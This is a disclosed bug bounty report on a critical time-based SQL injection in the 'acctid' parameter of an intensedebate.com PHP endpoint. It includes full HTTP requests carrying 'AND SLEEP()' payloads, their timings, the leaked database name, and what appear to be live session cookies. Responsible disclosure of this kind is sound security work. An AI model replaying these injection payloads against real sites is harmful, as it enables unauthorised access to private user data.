# [intensedebate.com] SQL Injection Time Based on /changeReplaceOpt.php

## Report Details
- **Report ID**: 1042746
- **URL**: https://hackerone.com/reports/1042746
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-11-24T22:49:14.934Z
- **Disclosed**: 2021-01-01T09:20:01.622Z

## Reporter
- **Username**: fuzzme
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
## Summary 

Hello, i have found a SQLI Injection Time Based on `https://www.intensedebate.com/changeReplaceOpt.php`.

The parameter `$_GET['acctid']` is vulnerable.



## Detection

I have inject a MySQL function `sleep()`,  and it works.


```
GET /changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(15) HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/install-t
Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572
```

Response time: 15 414 millis.


```
GET /changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(7) HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/install-t
Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572
```

7 486 millis.

## POC 

database() : id_commxn2s


Thank you, good bye.

## Impact

Full database access holding private user information.

## Attachments
- sleep7.png
- sleep15.png
- sqli.mp4
